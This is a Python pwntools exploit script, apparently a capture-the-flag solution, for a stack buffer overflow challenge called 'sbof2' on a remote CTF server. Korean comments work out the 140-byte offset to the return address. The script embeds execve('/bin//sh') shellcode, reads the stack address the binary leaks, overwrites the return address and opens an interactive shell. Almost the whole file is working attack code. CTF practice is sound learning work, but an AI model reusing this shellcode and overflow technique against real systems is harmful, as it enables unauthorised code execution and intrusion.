# -*- coding: utf-8 -*-
from pwn import * 
# = process("./sbof2")
p = remote("ctf.j0n9hyun.xyz",3006)
shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# 입력을 %[^\n]s 형태로 받는데, 이렇게 하면 공백까지 포함해 문자열을 입력받을 수 있게 된다. 
# 입력을 받은 다음, 해당 입력받는 위치 주소를 출력해주고 문자열을 출력한다. 
# 0xffffd470 부터 입력받음. eip 위치 0xffffd4fc, 거리는 8C(140)바이트.
# r <<< $(python -c 'print "a"*140+"BBBBBBBB\n"') | ./sbof2
# 실제로 입력을 넣어보면, ebp-0x8 위치에 0을 넣는 동작이 있다. 
# 해당 위치는 문자열 128바이트 입력 이후 위치 이므로, 쉘코드의 길이를 그거보다만 작게 하면 될거같다.
# 생각해보면, 스택 주소가 고정이 아닌 가변이다. 그런데 바이너리에서 주소를 출력해주니니까
# 해당 주소값을 받아와서 넣어주면 될거같다. 
slen = len(shell)
payload = shell+"\x90"*(140-slen)+p32(0xffffd470)

p.sendlineafter("Data : ",payload)
pause()
addr=int(p.recvuntil(":")[:-1],16)
log.info("stack addr = "+hex(addr))

p.sendlineafter("(y/n):","y")

payload = shell+"\x90"*(140-slen)+p32(addr)
p.sendlineafter("Data : ",payload)

p.interactive()